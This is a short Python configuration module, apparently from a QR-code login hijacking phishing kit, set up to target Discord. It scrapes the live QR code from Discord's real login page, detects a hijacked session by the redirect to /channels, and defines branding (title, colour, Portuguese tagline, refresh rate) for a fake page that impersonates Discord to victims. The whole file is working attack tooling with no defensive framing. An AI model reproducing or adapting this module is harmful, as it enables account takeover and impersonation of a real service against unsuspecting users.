# -*- coding: utf-8 -*-
from modules import Module

MODULE = Module(
    name="discord",
    url="https://discord.com/login",
    qr_selectors=[
        "img[class*='qr']",
        "div[class*='qr'] img",
        "canvas",
    ],
    success_selectors=[],
    success_url_contains=[
        "/channels",                # após o login a URL muda para /channels/@me
    ],
    pre_click_xpath=[
        "//a[contains(., 'QR')]",   # "Entrar com o QR Code" / "Log in with QR"
    ],
    browser="auto",
    note=("Versões recentes do Discord podem pedir confirmação no celular "
          "após escanear. O fim da sessão é detectado pela mudança de URL."),
    phishing={
        "TITLE": "Discord",
        "COLOR": "#5865F2",
        "TAGLINE": "Converse, jogue e saia com seus amigos.",
        "FOOTER": "Entre com a sua conta para continuar.",
        "REFRESH_MS": "2500",
    },
)
